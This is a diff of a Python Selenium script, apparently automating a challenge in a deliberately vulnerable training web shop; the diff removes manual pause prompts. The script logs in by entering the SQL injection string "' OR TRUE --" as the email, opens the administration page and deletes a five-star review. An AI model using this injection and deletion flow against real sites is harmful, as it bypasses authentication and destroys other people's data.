@@ -23,17 +23,13 @@ try:
 	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Login')]"))).click()
 	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "email"))).send_keys("' OR TRUE --")
 	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "password"))).send_keys("Password1!")
-	input("Please press enter...")
 	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Log in')]"))).click()
 	
-	input("Please press enter...")
 	#User navigates to administration page
 	driver.get(f"http://{IP_ADDRESS}:{PORT}/#/administration")
 
-	input("Please press enter...")
 	#User deletes 5 star review
 	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//mat-row[.//*[count(./mat-icon) = 5]][1]//mat-cell[contains(@class, 'mat-column-remove')]/button"))).click()
-	input("Please press enter...")
 
 finally:
   driver.quit()
